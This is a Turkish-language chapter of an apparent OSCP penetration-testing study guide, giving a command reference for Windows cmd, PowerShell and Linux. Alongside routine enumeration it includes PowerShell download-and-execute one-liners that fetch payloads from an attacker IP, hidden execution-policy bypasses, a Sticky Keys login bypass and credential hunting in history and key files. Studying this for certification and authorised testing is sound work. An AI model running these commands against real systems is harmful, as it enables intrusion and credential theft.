---
layout: page
title: "Bölüm 17 — Komut Referansı (cmd / PowerShell / Linux)"
oscp: true
toc: true
permalink: /oscp/17-komut-referansi/
---

{% raw %}
Bu bölüm, saldırı sırasında en sık gereken **yerleşik (built-in) komutların** hızlı
referansıdır — Windows cmd, PowerShell ve Linux/bash. Kural: **araç indirmeden önce
yerleşiği dene.** LOLBAS/GTFOBins mantığı: hedefte zaten var olan ikililerle enum,
transfer ve bazen privesc yapılır; bu hem AV'den kaçırır hem de kısıtlı shell'de
çalışır. Derin privesc enum için [Bölüm 4 (Win)](/oscp/04-windows-privesc/) /
[Bölüm 5 (Linux)](/oscp/05-linux-privesc/).

## 17.1 Windows cmd — Sistem & Kullanıcı

```cmd
ver & systeminfo                      :: sürüm / build / hotfix / domain
hostname & whoami & whoami /priv & whoami /groups
echo %USERNAME% %USERDOMAIN%
net user                              :: yerel kullanıcılar
net user Administrator                :: tek kullanıcı detayı
net localgroup                        :: yerel gruplar
net localgroup administrators         :: grup üyeleri
net group /domain                     :: (DC'de) domain grupları
net share & net view & net view /domain   :: paylaşımlar / ağdaki hostlar
net use                               :: bağlı sürücüler/oturumlar
ipconfig /all & route print & arp -a & netstat -ano
tasklist /svc & sc query & query user
```

## 17.2 Windows cmd — Dosya & Arama

```cmd
tree /F                               :: recursive listeleme
dir /A:H & dir /A:R                   :: gizli / read-only dosyalar
where /R C:\ *.kdbx                   :: dosya ara (büyük/küçük harf duyarsız)
findstr /si password *.txt *.ini *.config *.xml   :: içerik ara (recursive)
type file.txt & more file.txt
echo metin > a.txt & echo ekle >> a.txt            :: oluştur / append
copy / xcopy /E / robocopy /E (dizin kopyalama; robocopy /MIR dikkat!)
ren eski.txt yeni.txt & del /A:H *.*
set & echo %WINDIR%                   :: ortam değişkenleri
cmd1 && cmd2    (başarılıysa)     cmd1 || cmd2   (başarısızsa)
doskey /history                       :: oturum komut geçmişi (kalıcı değil)
```

> **sethc (Sticky Keys) hilesi:** Recovery/fiziksel erişimde `sethc.exe`'yi
> `cmd.exe` ile değiştir → login ekranında Shift×5 → **SYSTEM** cmd (auth bypass).

## 17.3 PowerShell — Temeller

```powershell
Get-Location            # pwd            Set-Location X   # cd
Get-ChildItem -Force    # ls -a          Get-Content f    # cat
Get-Command -verb get ; Get-Command -noun *user*          # komut keşfi
Get-Help <cmdlet> -Examples ; Update-Help
Get-Alias ; fl ; ft                                       # format-list / table
Get-Module -ListAvailable ; Import-Module .\PowerView.ps1 # modül yükle
```

**Komut geçmişi avı (sık credential kaynağı):**

```powershell
Get-History
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# PSReadLine "password/secret/apikey/token" içeren satırları filtreler ama
# plaintext parola sık sık yine de burada kalır — mutlaka oku.
```

## 17.4 PowerShell — İndirme / Çalıştırma / Bypass

```powershell
# İndir (bkz. Bölüm 12)
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/x.exe','C:\Users\Public\x.exe')
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1')
Invoke-WebRequest http://10.10.14.5/x.ps1 -OutFile x.ps1 -UseBasicParsing

# Execution Policy bypass (kalıcı iz bırakmadan)
Get-ExecutionPolicy -List
Set-ExecutionPolicy -Scope Process Bypass
powershell -ep bypass -nop -w hidden -c "<komut>"
# Base64 encode komut çalıştırma
powershell -enc <BASE64_UTF16LE>
```

## 17.5 Linux — Sistem & Ağ

```bash
id ; whoami ; hostname ; uname -a ; cat /etc/os-release
sudo -l                               # çalıştırılabilir sudo kuralları (privesc!)
cat /etc/passwd ; cat /etc/group ; getent passwd
w ; last ; lastlog                    # oturumlar
ip a ; ip route ; arp -a ; ss -tulpn  # ağ / dinleyen portlar
ps auxf ; crontab -l ; cat /etc/cron* # süreçler / zamanlanmış işler
env ; cat ~/.bashrc ~/.profile
```

## 17.6 Linux — Dosya, İzin & Arama

```bash
ls -la ; ls -lan                      # sahiplik + UID/GID
find / -perm -4000 -type f 2>/dev/null         # SUID binary'ler (privesc)
find / -writable -type d 2>/dev/null           # yazılabilir dizinler
find / -name 'id_rsa' -o -name '*.kdbx' 2>/dev/null
grep -rinE 'password|secret|api[_-]?key' /var/www /etc /opt 2>/dev/null
locate <isim> ; which <bin> ; file <bin>
getcap -r / 2>/dev/null               # capabilities (privesc)
chmod 400 id_rsa                      # SSH key kullanımı için zorunlu
```

## 17.7 Linux — Metin İşleme & Tek Satırlıklar

```bash
grep -i "needle" file ; grep -rn "needle" .          # ara
awk -F: '{print $1}' /etc/passwd                     # alan ayıkla
sed -n '10,20p' file ; cut -d, -f2 file
sort file | uniq -c | sort -rn                       # frekans
cat file | tr ',' '\n'                               # karakter dönüşümü
for i in $(seq 1 254); do ping -c1 -W1 10.10.10.$i | grep "bytes from"; done   # ping sweep
curl -s http://host/ | grep -oE 'href="[^"]+"'       # link ayıkla
```

## 17.8 Yararlı Linkler

- **GTFOBins** — Linux yerleşik binary'leriyle privesc/kaçış: `https://gtfobins.github.io/`
- **LOLBAS** — Windows "living off the land" ikilileri: `https://lolbas-project.github.io/`
- **revshells.com** — reverse shell üretici: `https://www.revshells.com/`
- **HackTricks** — tüm servis/teknik derin referansı: `https://book.hacktricks.xyz/`

---

Komutları çalıştıracak bir shell için [Bölüm 13](/oscp/13-shell-payload/),
enum sonucunu saldırıya çevirmek için ilgili bölüme
([Bölüm 4](/oscp/04-windows-privesc/) / [Bölüm 5](/oscp/05-linux-privesc/) /
[Bölüm 6](/oscp/06-ad-enumerasyon/)) dön.

[← Bölüm 16](/oscp/16-post-exploitation/) · [OSCP Ana Sayfa →](/oscp/)
{% endraw %}
